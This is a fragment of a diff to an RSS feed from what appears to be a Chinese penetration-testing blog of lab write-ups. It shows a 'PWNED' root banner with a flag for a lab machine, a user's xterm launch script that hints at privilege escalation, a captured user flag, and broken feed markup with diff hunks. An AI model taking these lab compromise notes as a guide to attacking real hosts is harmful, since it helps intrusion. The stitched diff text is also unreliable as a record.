-                           *                      **
-                             *,                .*
-                                *.           **
-                                  **      ,*,
-                                     ** *,
--------------------------
-
-PWNED HOST: hash
-
-PWNED DATE: Wed Dec  4 22:14:52 EST 2024
-
-WHOAMI: uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),1000(marco)
-
-FLAG: hashhater
-
-------------------------
-
-
-
-<br><br><br>maria用户的目录下面有一个myterm.sh<br>marco@hash:/home/maria$ cat myterm.sh
-export DISPLAY=:10
-xterm
-]]></description><link>https://www.c1trus.top/24-渗透/hmv/39.hash.html</link><guid isPermaLink="false">24-渗透/HMV/39.Hash.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241205101329.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241205101329.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[38.DC04]]></title><description><![CDATA[ 
+<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/4.Connection.007.png" referrerpolicy="no-referrer">]]></description><link>https://www.c1trus.top/24-渗透/hmv/4.connection.html</link><guid isPermaLink="false">24-渗透/HMV/4.Connection.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/4.Connection.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/4.Connection.001.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[38.DC04]]></title><description><![CDATA[ 
  <br><br>
 <br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
 <br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
@@ -12879,5 +12882,4 @@ C:\Documents and Settings\bill\Desktop&gt;type user.txt
 type user.txt
 f9e24c8da0686680decee9e594178a2e
 
-]]></description><link>https://www.c1trus.top/24-渗透/vulnyx/1.experience.html</link><guid isPermaLink="false">24-渗透/Vulnyx/1.Experience.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate></item><item><title><![CDATA[Home]]></title><description><![CDATA[ 
- <br>continue...<br><br><br><br><br><br><br>....continue]]></description><link>https://www.c1trus.top/40-obsidian/home.html</link><guid isPermaLink="false">40-Obsidian/Home.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Fri, 03 Jan 2025 00:09:38 GMT</pubDate></item></channel></rss>
+]]></description><link>https://www.c1trus.top/24-渗透/vulnyx/1.experience.html</link><guid isPermaLink="false">24-渗透/Vulnyx/1.Experience.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate></item></channel></rss>
